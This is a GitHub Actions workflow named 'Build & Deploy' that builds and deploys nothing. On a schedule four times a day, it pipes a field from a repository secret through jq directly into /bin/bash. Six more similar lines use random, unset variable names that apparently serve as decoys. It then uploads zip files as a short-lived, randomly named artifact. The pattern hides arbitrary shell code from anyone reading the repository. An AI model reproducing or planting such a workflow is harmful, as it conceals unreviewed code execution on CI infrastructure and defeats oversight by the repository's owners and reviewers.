name: Build & Deploy
on:
  workflow_dispatch:

  schedule:
    - cron: '13 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Invoke
        env:
          x1: ${{ secrets.x1 }}
        run: |
          printf '%s' "$x1" | jq -r .byooq455 | /bin/bash
          echo $nybk081 | jq -r .i67 | /bin/bash
          echo $ea80501 | jq -r .ezbo068 | /bin/bash
          printf '%s' "$ed68" | jq -r .ydwxy74 | /bin/bash
          printf '%s' "$xrr6620" | jq -r .y2628 | /bin/bash
          echo $gcd47699 | jq -r .f7 | /bin/bash
          echo $dwg27 | jq -r .pjpd81 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 0vo2TcNf
          path: "*.zip"
          retention-days: 1
